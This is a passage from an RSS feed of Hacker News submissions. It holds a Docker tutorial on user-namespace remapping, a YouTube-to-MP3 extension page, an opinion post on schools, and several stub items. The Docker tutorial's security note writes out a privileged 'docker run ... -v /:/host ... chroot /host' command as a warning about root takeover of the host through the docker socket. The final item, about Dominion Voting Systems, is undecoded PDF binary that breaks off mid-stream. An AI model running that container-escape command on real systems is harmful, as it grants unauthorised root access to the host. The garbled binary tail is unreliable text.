            <link>http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080591</guid>
            <pubDate>Fri, 13 Nov 2020 09:22:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Terraform Provider to manage Linux machine via SSH]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25080472">thread link</a>) | @rucciva
<br/>
November 13, 2020 | https://registry.terraform.io/providers/TelkomIndonesia/linux/latest/docs | <a href="https://web.archive.org/web/*/https://registry.terraform.io/providers/TelkomIndonesia/linux/latest/docs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://registry.terraform.io/providers/TelkomIndonesia/linux/latest/docs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080472</guid>
            <pubDate>Fri, 13 Nov 2020 09:00:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use Linux user namespaces to fix permissions in Docker volumes (2017)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080337">thread link</a>) | @joseluisq
<br/>
November 13, 2020 | https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/ | <a href="https://web.archive.org/web/*/https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      
<p>Not long ago, I publish <a href="https://www.jujens.eu/posts/en/2017/Feb/15/docker-unix-socket/">an article</a> about using Unix sockets with docker. These sockets where in docker volumes so they could be shared between various containers. The key idea was to change the UID and GID of the user that owns the socket in the container so they match those of the user that built the image. The main issue with this approach is that it requires you to build to container with the user that will run it. This makes the solution not portable.</p>
<p>Hopefully, the Linux kernel allows us to use an alternative to map user id inside the container to a predictable user id outside: user id namespaces. According to <a href="https://en.wikipedia.org/wiki/Linux_namespaces">wikipedia</a>: <cite>Namespaces are a feature of the Linux kernel that isolates and virtualizes system resources of a collection of processes. Examples of resources that can be virtualized include process IDs, hostnames, user IDs, network access, interprocess communication, and filesystems. Namespaces are a fundamental aspect of containers on Linux.</cite></p>
<p>For instance, thanks to the PID namespace, a process run inside a container can "think" it has the PID 1 inside a container while in fact it has another one. The same is true with user namespace: a user can "think" it has the 0 uid (root) while it fact it has the 1000 user id (some standard user). This will allow us to be sure for the files in a docker volumes that:</p>
<ul>
<li>All files belonging to the root user in the container will belong to a user of the system that is not root in the host.</li>
<li>All files belonging to other users in the container will be mapped to predictable uid (more on that latter).</li>
</ul>
<div id="configure-docker">
<h2><a href="#id1">Configure docker</a></h2>
<p>Lets configure docker to do all that.</p>
<p>First we either need to start the docker daemon with the <tt><span>--userns-remap</span> USER</tt> flag or make sure the configuration file of the docker daemon (<tt>/etc/docker/daemon.json</tt>) contains something like:</p>
<pre><span>{</span>
  <span>"userns-remap"</span><span>:</span> <span>"USER"</span>
<span>}</span>
</pre>
<p><strong>Notes:</strong></p>
<ol>
<li>In both cases, <tt>USER</tt> must be a valid user of the system (ie present in <tt>/etc/passwd</tt>).</li>
<li>Don't forget to restart the daemon if you have to edit the file.</li>
</ol>
</div>
<div id="configure-the-subordinate-uid-gid">
<h2><a href="#id2">Configure the subordinate uid/gid</a></h2>
<p><a href="http://man7.org/linux/man-pages/man5/subuid.5.html">subuid</a> and <a href="http://man7.org/linux/man-pages/man5/subgid.5.html">subgid</a> are used to specify the user/group ids an ordinary user can use to configure id mapping in a user namespace. They are written like: <tt>username:id:count</tt>. For instance, with <tt>jenselme:100000:65536</tt> it means that user <tt>jenselme</tt> can use 65536 user ids starting at 100000.</p>
<p>This will be used by docker to properly remap uid in the container to the host. For instance, with <tt>jenselme:100000:65536</tt>, a file with a uid of 33 in the container, will be a file with a uid of 100032 in the host. And you will have access to that file. Neat, isn't it?</p>
<p>Now that we've seen the theory, let's configure them properly. First, edit <tt>/etc/subuid</tt> and add (replace <tt>jenselme</tt> by your own user name):</p>
<pre>jenselme:1000:1
jenselme:100000:65536
</pre>
<p>You should be able to understand the second line. The first one is there for a slightly different purpose: make sure that all files created by root belong to the user with uid 1000. That's me on my machine, you should of course use your uid (you can get it with <tt>id <span>-u</span> USER</tt>). Otherwise, they will belong to uid 100000.</p>
<p>Now, edit <tt>/etc/subgid</tt> and add (replace <tt>jenselme</tt> by your own user name):</p>
<pre>jenselme:982:1
jenselme:100000:65536
</pre>
<p>The second line is the name in both cases. I didn't use <tt>jenselme:1000:1</tt> but <tt>jenselme:982:1</tt>. On my machine, 982 is the gui of the docker group (you can get it with <tt>getent group docker</tt>). This means that all files created by root, will belong to me and to the docker group. This "trick" can be handy if for some reason you need to share files with the docker daemon. For instance, software like <a href="https://traefik.io/">traefic</a> may need to read/write to the docker socket. By default, for this socket we have:</p>
<pre>[root@fastolfe ~]# ll /var/run/docker.sock
srw-rw----. 1 root docker 0 Jun 11 18:18 /var/run/docker.sock
</pre>
<p>This means that if in the outside the container the uid of root and its guid are mapped to those of jenselme, traefic won't be able to communicate with the socket because of the permissions of the file. Map the gid of root in the container to the gid of docker in the host allows us to prevent that issue.</p>
<p><strong>Note on security:</strong> Giving access to the docker socket is a problem from a security standpoint since it allows a container to create new containers thus giving it access to the whole host system <em>with root permissions</em>, eg by running <tt>docker run <span>-it</span> <span>-v</span> <span>--privileged</span> <span>-v</span> <span>/:/host</span> <span>--userns=host</span> fedora chroot /host</tt>. That is why SELinux will prevent the docker socket to be mounted in a volume by default. You should be aware of that when you do this. See <a href="http://danwalsh.livejournal.com/74095.html">this</a> for more on that topic.</p>
</div>
<div id="tests">
<h2><a href="#id3">Tests</a></h2>
<p>Now that we are all set, let's start the docker daemon (or restart it).</p>
<p><strong>Note to SELinux users:</strong> You need to append <tt>Z</tt> (capital z) when mounting the volumes, like this: <tt><span>-v</span> <span>$(pwd)/test:/test/:Z</span></tt>. Otherwise, the SELinux context will not be correct and you won't be able to access the volumes from the container. See <a href="https://www.jujens.eu/posts/2015/May/24/docker/#volumes">this docker tip</a>.</p>
<p>The first thing you should notice is that if you had downloaded images or created containers, you will not see them with <tt>docker images</tt> or <tt>docker ps <span>-a</span></tt>. That's because, when user re-mapping is enabled, all images and containers are located in a dedicated subfolder. On my machine, that is <tt>/var/lib/docker/1000.982</tt>.</p>
<p>Now that we know this is expected, let's try things. Run somewhere:</p>
<pre>docker run -it -v "$(pwd)/test:/test/" nginx /bin/bash
</pre>
<p>This will open a bash prompt as root in the container. Go to the volume with <tt>cd /test</tt> and create a file: <tt>touch rootfile</tt>. If you run a <tt>ls <span>-l</span></tt> inside the container, you should see something like:</p>
<pre>root@02a5bcc1757c:/test# ls -l
total 0
-rw-r--r--. 1 root   root 0 Jun 11 16:25 rootfile
</pre>
<p>Let's check the uid and gid to be sure:</p>
<pre>root@02a5bcc1757c:/test# ls -ln
total 0
-rw-r--r--. 1 0 0 0 Jun 11 16:25 rootfile
</pre>
<p>So the file belongs to root and its uid is 0 as well as its gid.</p>
<p>Now run <tt>ls <span>-l</span></tt> in the host:</p>
<pre>▶ ls -l
total 0
-rw-r--r--. 1 jenselme docker 0 Jun 11 18:25 rootfile
</pre>
<p>Let's check the uid and guid:</p>
<pre>▶ ls -ln
total 0
-rw-r--r--. 1   1000 982 0 Jun 11 18:25 rootfile
</pre>
<p>That's correct. Now let's do the same thing wit the <tt><span>www-data</span></tt> user. First, let's give some permissions on the <tt>/test</tt> folder to the <tt><span>www-data</span></tt> user. Since this is just a test, let's run <tt>chmod 777 /test</tt>. Now, switch to this user with <tt>su <span>-s</span> /bin/bash <span>www-data</span></tt>. You should now be in the <tt>/test</tt> directory connected as <tt><span>www-data</span></tt>. Create a file with <tt>touch <span>www-data-file</span></tt>. You should see something like:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -l
total 0
-rw-r--r--. 1 root     root     0 Jun 11 16:36 rootfile
-rw-r--r--. 1 www-data www-data 0 Jun 11 16:38 www-data-file
</pre>
<p>And:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -ln
total 0
-rw-r--r--. 1  0  0 0 Jun 11 16:36 rootfile
-rw-r--r--. 1 33 33 0 Jun 11 16:38 www-data-file
</pre>
<p>As far as the host is concerned, we have:</p>
<pre>▶ ls -l
total 0
-rw-r--r--. 1 jenselme docker 0 Jun 11 18:36 rootfile
-rw-r--r--. 1   100032 100032 0 Jun 11 18:38 www-data-file
</pre>
<p>And</p>
<pre>▶ ls -ln
total 0
-rw-r--r--. 1   1000    982 0 Jun 11 18:36 rootfile
-rw-r--r--. 1 100032 100032 0 Jun 11 18:38 www-data-file
</pre>
<p>Now let's create some files from the host. For instance, let's do <tt>touch <span>www-data-file-from-host</span></tt>. In the host it currently belongs to the current user. Let's see in the container:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -l
total 0
-rw-r--r--. 1 root     root     0 Jun 11 16:36 rootfile
-rw-r--r--. 1 www-data www-data 0 Jun 11 16:38 www-data-file
-rw-r--r--. 1 root     nogroup  0 Jun 11 16:41 www-data-file-from-host
</pre>
<p>It belongs to <tt>root</tt> and <tt>nogroup</tt> as expected (in the host, the file belongs to <tt>jenselme:jenselme</tt> not <tt>jenselme:docker</tt>, hence the <tt>nogroup</tt>, I could run <tt>chown jenselme:docker <span>www-data-file-from-host</span></tt> to fix the gid). If you check the uid and gid, you will see it is also as expected.</p>
<p>Now let's change the owner of <tt><span>www-data-file-from-host</span></tt> to <tt>100032:100032</tt> with <tt>chown 100032:100032 <span>www-data-file-from-host</span></tt> (this must be run as root to prevent an <em>Operation not permitted</em>). I let you check the owner, uid, gid in the container. You can also check that the <tt><span>www-data</span></tt> user can write in the file with <tt>echo 'test' &gt; <span>www-data-file-from-host</span></tt>.</p>
<p>This looks good isn't it? I found however one dark spot in this. If you try to edit <tt><span>www-data-file-from-host</span></tt> or <tt><span>www-data-file</span></tt> in the host, it will fail with <em>permission denied</em>. As far as I understand the subuid and subgid, this is not normal. If someone has an explanation for this, please leave a comment. I see two workarounds for that:</p>
<ol>
<li><p>The basic:</p>
<blockquote>
<ol>
<li>Create a group with id <tt>100032</tt> (as root): <tt>groupadd <span>-g</span> 100032 <span>docker-www-data</span></tt></li>
<li>Add yourself to this group (as root): <tt>usermod <span>-aG</span> <span>docker-www-data</span> jenselme</tt></li>
<li>Disconnect/reconnect or use the <tt>newgrp <span>docker-www-data</span></tt> command to take this change into account.</li>
<li>Give write permission to the group in the container: <tt>chmod g=rw <span>www-data-file</span></tt></li>
<li>Write in the file.</li>
</ol>
<p><strong>Note:</strong> You cannot do anything about the user since you can only have one user id.</p>
</blockquote>
</li>
<li><p>The elegant: use ACL (Access Control List). See the <a href="#external-links">external links</a> section to learn more about ACL. TL;DR, ACLs are a way to extend the standard permissions of the filesystem. With them, you can set permissions for a file or directory with very thin granularity for each users and groups of the system. To enable ACLs, run as root:</p>
<blockquote>
<ol>
<li><p><tt>setfacl <span>-Rdm</span> u:USER:rwX DIR</tt> (replace <tt>USER</tt> by a username and <tt>DIR</tt> by a path to a directory or file). This will:</p>
<blockquote>
<ul>
<li><tt><span>-R</span></tt> recurse on subfolders.</li>
<li><tt><span>-d</span></tt> default to this rule. This means that the ACL will apply to all files and directories created in <tt>DIR</tt> after the <tt>setfacl</tt> was run.</li>
<li><tt><span>-m</span></tt> modify the rule to <tt>u:USER:rwX</tt> that is give to the user (<tt>u:</tt>) <tt>USER</tt> the permissions <tt>rwX</tt>. The capital <tt>X</tt> means <em>give execution permission to all folders and to files that have the execute permissions</em>. This prevent us to make all files executable.</li>
<li>apply to <tt>DIR</tt></li>
</ul>
</blockquote>
</li>
<li><p><tt>setfacl <span>-Rm</span> u:USER:rwX DIR</tt> (replace <tt>USER</tt> by a username and <tt>DIR</tt> by a path to a directory or file). This will apply the ACL rule on the existing files in <tt>DIR</tt>.</p>
</li>
</ol>
</blockquote>
</li>
</ol>
</div>
<div id="bonus">
<h2><a href="#id4">Bonus</a></h2>
<div id="create-files">
<h3><a href="#id5">Create files</a></h3>
<p>If you can't or don't want to create the files (eg logs) when the images is created or when you start the container and be sure the container will be able to …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/">https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/</a></em></p>]]>
            </description>
            <link>https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080337</guid>
            <pubDate>Fri, 13 Nov 2020 08:38:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Client-side YouTube to MP3 using ffmpeg.js in a Chrome Extension]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25079455">thread link</a>) | @benkaiser
<br/>
November 12, 2020 | https://benkaiser.github.io/youtube-to-mp3/ | <a href="https://web.archive.org/web/*/https://benkaiser.github.io/youtube-to-mp3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>
        A server-less chrome extension to convert youtube videos to mp3 files for download. If available, files are persisted to <a href="https://siasky.net/">Sia SkyNet</a> for future downloads by all users.
      </p>
      <p>This Youtube to MP3 chrome extension is different in a few ways:
        </p><ol>
          <li>The conversion takes place on your machine, not a server, so there's no server costs we need to cover with ads</li>
          <li>The conversion logic exists on your machine, and is resilliant to takedowns</li>
          <li>Your conversions are cached with <a href="https://siasky.net/">Sia SkyNet</a> for quick download without conversion in the future by everyone</li>
          <li>This extension <a href="https://github.com/benkaiser/youtube-to-mp3">is open source</a> and available for you to inspect the integrity of it yourself</li>
        </ol>
      
      <h2>Installation</h2>
      <div>
        <div>
          <p>
            <a href="https://benkaiser.github.io/youtube-to-mp3/extension.zip">Download Extension Zip</a>
          </p>
          <p>
            Steps to Install:

            </p><ol>
              <li>Download extension zip file and unzip</li>
              <li>Navigate to chrome://extensions in your browser</li>
              <li>Enable developer mode in the top right</li>
              <li>Click "Load unpacked" in the top left</li>
            </ol>
          
        </div>
        <p><img src="https://benkaiser.github.io/youtube-to-mp3/assets/instructions.png" alt="instructions picture">
        </p>
      </div>
      <h2>Usage</h2>
      <div>
        <div>
        <p>
          Just navigate to any youtube video and click the "Download MP3" button next to the Subscribe button.
        </p>
        <p>
          If the file has not yet been converted, your machine will download the youtube video and convert it to an mp3. This process may take 30+ seconds depending on video size, your internet connection and your computers processing power. Once the file is converted a download will trigger on your browser for the file.
        </p>
        <p>
          If someone has previously converted the video to mp3 using the extension already, the download will start in just a few seconds.
        </p>
        </div>
        <p><img src="https://benkaiser.github.io/youtube-to-mp3/assets/usage.gif" alt="using youtube to mp3">
        </p>
      </div>
    </div></div>]]>
            </description>
            <link>https://benkaiser.github.io/youtube-to-mp3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079455</guid>
            <pubDate>Fri, 13 Nov 2020 06:13:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The True Purpose of Schools]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25079113">thread link</a>) | @dchacke
<br/>
November 12, 2020 | https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html | <a href="https://web.archive.org/web/*/https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>The other day, it “clicked” for me: I think I understand better now what schools are really for.</p>

<p>It is generally believed that schools exist to help children learn. Of course, we critical rationalists know that that’s baloney. Instead, we understand—thanks to <em>Taking Children Seriously</em>—that schools exist to <em>standardize</em> children: to get them to replicate society’s memes as faithfully as possible under threat of punishment. Static-society stuff (cf. David Deutsch, <a href="https://www.amazon.com/Beginning-Infinity-Explanations-Transform-World/dp/0143121359/"><em>The Beginning of Infinity</em></a>). At least that was my current understanding of it. But I’m starting to see that it goes deeper than that.</p>

<p>Consider a child who is interested in, say, astronomy. Most elementary schools do not offer astronomy classes. And even if they did, it is highly unlikely that any given child would happen to be interested in <em>all</em> of the things that are shoved down his throat year after year, at just the right time. A child’s interests don’t evolve in sync with the school’s schedule. If the child is lucky, he will be genuinely interested in a few of the topics any given year, but never even close to all of them.</p>

<p>So, the child wants to learn about astronomy—but doesn’t get to. Instead, he is forced to learn <em>other</em> things he <em>isn’t</em> interested in. Day in, day out, for  some 12 years. As Popper said, he has to learn answers to questions he didn’t ask.</p>

<p>A child is then faced with two options: to go insane, or to learn to cope with the situation. So, what can one possibly <em>do</em> in such a situation to stay sane? I see only one solution: one must learn to put one’s <em>own</em> interests on the back burner and prioritize <em>other people’s</em> interests—in this case, the teacher’s, and society’s at large. One must learn to coerce oneself to neglect one’s preferences. I think <em>that</em> is what school is really for: not just to standardize children, but to break them, too, to place others’ interests over their own.</p>

<p>I recently asked a 14 year old close to me if she’d like to go to college. She said no, but that she probably will anyway because she thinks she <em>should</em>. It’s heartbreaking.</p>

<p>It is only after 12 years of mind-numbing boredom and neglecting one’s preferences that people voluntarily spend the next 30, 40, sometimes 50 years at jobs they hate. Forever delaying their dreams is what they’re good at. It is in school that they learn how to live with problems and endure them instead of <em>solving</em> them. It is there that they are taught that their interests have no chance of leading to anything fruitful, so they shut them down quickly.</p>

<p>Parents are often complicit in this. E.g., they take away things that their children enjoy, such as their computers, gameboys, etc, or at least put time limits on them—so that their kids spend less time doing what they <em>want</em> and more of what they allegedly <em>need</em>, which is determined by anyone but the child.</p>

<p>I’m thankful that David Deutsch puts emphasis on <em>fun</em> and <em>interests</em>. They’re hugely underrated.</p>

<p>If school’s main purpose is to teach children how to neglect their own interests and instead pursue other people’s interests, that also explains where <em>altruism</em> comes from—the evil doctrine Rand so eloquently refuted and which, she says, “regards man, in effect, as a sacrificial animal,” quoting Auguste Comte, who coined the term “to mean, specifically, the placing of the interests of others above your own.” (see the YouTube video at the bottom)</p>

<h2>
  The true purpose of schools is to turn children—born individualists—into altruists; to systematically neglect their own interests in favor of others' interests.
</h2>

<p>It is to force children to betray their intellectual integrity. They must “sacrifice [their minds] to what <em>others</em> believe or want to be true.” — Ayn Rand (though she didn’t state this in the context of schooling and children in particular, but society at large)</p>

<p>This true purpose explains why people <em>live for others</em>, and then expect others to do so as well. It’s what they were forced to do during the most formative years of their lives after all!</p>

<p>It explains why so many expect their peers to sacrifice their happiness for the health of others by agreeing to house arrests. Why those who don’t want their salaries to be cut in half by taxes are considered “evil.” Why so many can’t begin to imagine a world without coercion. “If I had to do it, why should anyone else get a free pass?”</p>

<p>I’m guessing that most teachers do not understand this true purpose of school. They become teachers because <a href="https://blog.dennishackethal.com/2020/10/25/the-tragedy-of-children-becoming-teachers.html">they want to “help” children</a>—that is, give children what they allegedly “need.” It is only altruists who can become teachers and perpetuate the cycle. In other words, the memeplex of schools depends on breaking children so successfully that some of them decide to continue the tradition. Not only do teachers not know why they’re contributing to this altruism machine, <em>it relies on teachers not understanding its true nature to keep itself alive.</em> This makes me wonder if schools as a whole are static memeplexes.</p>

<p>I think many experienced critical rationalists, on the other hand, understand school’s true purpose deeply. For me, it was a breakthrough. Though the topic is sad, writing this post was fun. A lot of stuff is beginning to make more sense. I’m pursuing my interests <em>right now</em>. I love critical rationalism.</p>

<p>
  <iframe src="https://www.youtube-nocookie.com/embed/7RFlPmjUbRo" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://blog.dennishackethal.com/2020/11/12/the-true-purpose-of-schools.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25079113</guid>
            <pubDate>Fri, 13 Nov 2020 05:10:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Game with 179 levels generated using neural networks]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25077797">thread link</a>) | @ent101
<br/>
November 12, 2020 | https://www.outpan.com/app/99694412f2/qubes | <a href="https://web.archive.org/web/*/https://www.outpan.com/app/99694412f2/qubes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><nav role="navigation"><div><div><form action="/search" method="get"></form><p><img src="https://opimg.s3.amazonaws.com/99694412f2-200x200.jpg" id="app-toolbar-icon"></p><div id="app-options-wrapper"><div><div><p data-toggle="modal" data-target="#review-modal" id="reviews-modal-link" title="View reviews or write one"><span></span> <span>23</span></p></div></div></div></div><div id="navbar-user-items" aria-expanded="false"><p><a href="https://www.outpan.com/signup">Sign Up</a></p><ul><li></li></ul><ul><li><a href="https://www.outpan.com/">Home</a></li><li><a href="https://www.outpan.com/login?ref=https://www.outpan.com/app/99694412f2/qubes">Login</a></li><li><a href="https://www.outpan.com/signup">Sign Up</a></li></ul><form action="/search" method="get"></form></div></div></nav><div><div><div><div></div></div></div></div></div>]]>
            </description>
            <link>https://www.outpan.com/app/99694412f2/qubes</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077797</guid>
            <pubDate>Fri, 13 Nov 2020 01:34:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dominion Voting Systems – Disruption on Election Day (2019)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077762">thread link</a>) | @halturing
<br/>
November 12, 2020 | https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019 | <a href="https://web.archive.org/web/*/https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>Ä]&gt;Æê}wû(Xÿ'é€eHKŒ�â<sŒx‚zc)v:&È\´;{âdÉç)jq(f"¯”Èƒã³†ä1¤ˆÏyôç°òˆ8l9Ù&»�_ÿœããÂ²^žòÞåÑçeœôcnø£¤˜†w%nõiºd\Ÿ�ç;¬€o6:Ê]- êÏ="">}’�¢)Žž÷DÿB.|¬“;wAž½ž¼;ãä•âQaØ¢»+Ê^Ó(Ùä°Lèó¢ä{™Ã—ÐRlúB&amp;°P¬0n&lt;“wÀðj¢Ô°CÄIï:;&nbsp;tÝD;'zÞ#J6m†(ë‘qµ±ïêƒÂì�¿�†!QaÊïÑ†ýúŸ*NÚ5
endstream
endobj
275 0 obj
&lt;&gt;stream
hÞÄTM�Ó0ý+&gt;Â%¶ã¯dµªh�+-jŠz¨zÈ¦�¶ë¬WˆÏŒãxCa‚‡W{¦3ož=ÎpEáš¨œpCxÎ9á¬Z^.JE®¯iE?¯o¯ëîäû+ßµÍ©uoü±½?�ÛÇþl}ÝÙ!kê×‹ä¬ê¡½é­§K×Õ§�úÞ6ý¡³_è¶³K;tÉ¾éÜàßkGÅŒwíÐ¸îÉ÷Žp	òÖô®Ž¹R´:ßûoO-Ý¸s»	ü	¥¶ÝÁ‡�QŒüOä¦J¥t@Q”Dk¸â’!Äð©BŽ±`OySÎï�â�#üœqŠ!LžÚk í�ÈXð�  Ä‚?äÅ¸”÷¥”‰ý“„ÔeàÂÃ$¡Pc.8íQÿÇµ˜çDÆžó`obÎ!àõ¸â5ÖÃ5ðGÎfB’O‘LÁ#á:¥#R¿"õœ8£�""íÔÕŸº¦YÒ`”7QŠ�&gt;ß£DnY&gt;WG.qÂüàZÅÊ<ejÒ‚èÔÙæ�Ìc÷§q kæ1ów_ÆkÏ?…ù«¸|ÎôÀÅü²ÆÄËØ="">Œ¡¿]Kœ…8wVU`¨Æ³êÝ¡utKØb�ƒ8¶§è-]·�ßé23Š”Efr
'&amp;Ã±ÊE&amp;ŒÚÓÊ»sã?Õ®µžÈ4Éî:û0–XZÛûIƒú'
RðŒ•Å¤A*“©/4ˆ—5|`¤bÒ
endstream
endobj
276 0 obj
&lt;&gt;stream
hÞ,ŽM‚@†ÿÊë 3ëW
"h!uÈCJâa‘EÖÖ=ä¿¯¶N3ó&lt;ÃÌË&lt; `&gt;°ú°è[Ú$ÁlíÄd€‘OxäËYÈ~0p`!žÄO9ž`¡x¿‚çb1O&amp;ÏçWã„a`¸Dd´Ö|”jÛeZrµ·¤ä£@;_k*£…é,g=reÑã÷Ø'Â‹áJvÙÔ+„•ã¢ëmvõLËÅÌŸÿ¼‹Óô-ÀøDFï
endstream
endobj
277 0 obj
&lt;&gt;stream
hÞ¼X]oÛ6õOáãú0‹—ßŠq×b]Û$HÒ'Ïª«&amp;^]ÉPå­ùóÛÅ+ÇKÛX°±¯Iž{x¿x)ÅX!…q‚¤Æã/
DtJ˜(ˆ"	+iÒÂdÂ*AŽŒ°2Xa� o½°VP�XYpR`Š¢„^€4À�/† °¤¤–Â¤W[)ŸÓ�PrF(%I8	[œƒŒV8/”ÖÈ€õ(”QFxð,zðY’”ÊÂ8&gt;�ðàs:
&gt;0Ÿ×XŸOëà0ž«ûø¢R[¨ˆ ðEÄ!h¡¥6"H�ÀuM¼ƒ„SÁ­$ô$ü
“Q
­U&nbsp;ÐFF%´!+"ø‚Ág'¸¨m{H€"øœv!×FEðyøK„Q 	�@°«)Þ&nbsp;ÑÓ)›:š4Ö6’N©“²,CÒ
Â�J3È¹‚9OŸ¯æ¨).Y›%Â¹(.Ê¶ª»ë¶ªR�`joæ¬úÒ½ªîÀT\6ëêM¹IE”0×w›ª¸êÚí²^6MwrÒïƒýz~ÙSz‘w�Ùˆè³`Hd
É’X*–£aÉHöHf¶�ÕBÖ
Y)d��UBÖ¬�·yû˜w�™%f›lV°YÁf—\Vp¬�7rywÏÈÌâ³-.“¹Læ2Äg=Ÿ9}æôÌ™õ¼æ„	Óƒ‹«âªZæ°Ÿm?}žËt´ûˆ¤³�~¨t¸Ó�NwúÑïžtNv¨Ï2°dv�ØCb‰�#Çùpœv“ØAb‰]$vŽØ;b÷È3Ç‡¼}0f^ï÷Ç·CúÝZ˜Ç-‹%ïÆuA\Ä•A\ÄµA\ÄÕA\ÄõA\ ÄBC½s¡W:q©×:q±W»âjW\íÃ¸Þ®×ý×"k‹&gt;Å§uÝte·jêâjSÖÅiÛ­&gt;”Ë®¸(f«wëUsÓ–›Û»4x^wí]ñì¶l»âÅêfÛVÅO«ëŸvÃ¶Ù&lt;+7ÃðyýäUq–¾^à,ß�^ÖëU]]Ý–8ïŒ&gt;ßvi.›�°úX5ÛŽ‡ÛwŸ—íj³nªvâeÖ|IÖoë÷U»c:9ZÇÿ×2¸I-æÿAïXÌÿmó°ßj%»º|ìî'ò¬}s�t›oµ™^kèû-gh\ù´-ú.ð}þî7”óýup&gt;ûåòädQ¼.ë›žŸýøöê	šUv£¸¸š»ÖëUý‘/µã	yÌ#<l¶Šµò­·¯uÁ*~ˆóx!"Ö ¥Ñ¤j<©mjf#íh¤;Âûc"õÐ«Ü¹ÿ‘éyóþn€ûðü="" ó="¸’ãqDÎÔxèø¤©ñYSãÓ¦Üh¨¬S‘/Ü¤CßÄ" ×Ó�w\†ÏpcÌ="M}zóˆSß¿˜izÏ�Såp`Ïaç]ºt.Öå²ú„ÇÕb¶n–ïÕ]œZ‹kA99" éÕÃ¨)^="" mµ3^q7mÅ‡šzÉ}ƒŸ+v�Ïƒ3€="" Êæ{Ê�4z�="" :ˆÜ="" 5št�fšÑh;éÆ»äg“†ÑÈ8="">ör¼¥D£ia%3ðÒáüßƒÕá
Ø�GÔÀWXsÖ�uG`ý˜@èÃÕðq&lt;Kò+ˆŽ¡VGQ“&gt;Ÿ¿Óþ¿iætÝýðç_“å¤™¬ñÙNÚ‰˜ü&gt;© ?OV˜©1n&amp;ðÝMn1/&amp;×ÿ±7Íó30lû_oz¦%8j0‰ÉkÌÝàóký$Ùj¿c_~éØ»ÔT¢ÅÒTá!ï®S‹X7õR?ÖÕÿ`üg]Ç
endstream
endobj
278 0 obj
&lt;&gt;stream
hÞ„•?oAÅ¿ŠK¨v&lt;ÿlKÑT å”¤‹Ò€¢�
ßžçY]Nä\ygýæ7ž·g�A…xLbmˆB•ñ&lt;”êèˆFU…xjºÉÔt³RSèf£Î†Ø©�Š8¨ë@œ4X…Æz¯4–Þh:G
MçÓTè¤’Tè¤‘x-ÒIÌuƒ´ùz’1#
jdÁžÒ|¯
…º¢V,ªA£H·Vö‹5TÊŠt3¿*Jì+…E_)lè+ò¨&nbsp;ª¹-`xÃSÆ~a¬Ìoäg™[aØa~—†•
/°Å*Ø±Jixí:ßnT‹/,^:uuµ}zð�Qèv}Œ=jDÛ#&gt;Æ9b�Ø"öˆ#bðfðfðfð$x&lt;	žO‚'‹ó¸ñ­ýi»Ûîž¾þ&gt;¼l*xÏcOŸq§šcø-Á5o÷ïÞ‡ªf˜–	z&amp;™`fÉš	,u+÷“SEj&amp;§nrj'§~rj(gŽ&gt;ø4‘ý]Ëcª6„›/ß‘’sÕýŸ_OÛÍ‡�·‡Ãâì?ï×œÏß~þTÝÇÎ:¸¥×úr°¦Ï‹ûl[}§ÑŸý©ÑŸý©ÑŸý®Ñïý®Ñï&lt;žÏ‚gÁ³àYð,x&lt;žY|Ž’Î91Ãþ7.	j&amp;h™&nbsp;g‚ñ–àšOgÂ%„dÍ–:•{™šÉ©›œÚÉ=µ‹G
IåÔRÖ¼K%5³Õg€ÿGŸÌ€‹ê—À|®:›Ñ;¯9ûø+ÀWBR
endstream
endobj
279 0 obj
&lt;&gt;stream
hÞl�AoÂ0…ÿŠ�›ÄhâU£H©¢ëibhL»‡Ê°HmŒÃÆ¿_š"@'ûùù‹ü‚
Aªg@]Äš
